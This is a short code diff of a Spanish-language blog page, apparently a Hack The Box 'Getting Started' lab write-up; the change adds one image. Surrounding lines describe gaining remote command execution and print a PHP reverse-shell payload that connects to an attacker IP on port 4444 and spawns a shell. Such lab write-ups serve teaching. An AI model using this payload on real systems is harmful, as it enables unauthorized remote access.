@@ -100,6 +100,8 @@ export default function Getting_Starterd_HTB() {
       <br />
       <img src="/images/Blog/Getting_Started_HTB/component1.png" alt=""/>
       <br />
+      <img src="/images/Blog/Getting_Started_HTB/component2.png" alt=""/>
+      <br />
       <p>Dado que el servidor nos interpreta la instrucción tenemos ejecución remota de comandos en el servidor. Con lo que debemos intentar lanzarnos una bash a nuestro equipo atacante para trabajar mejor.</p>
       <br />
       <pre className="rounded bg-muted p-4 overflow-auto">{`<?php system('php -r \'$sock=fsockopen("10.10.15.64",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''); ?>`}</pre>
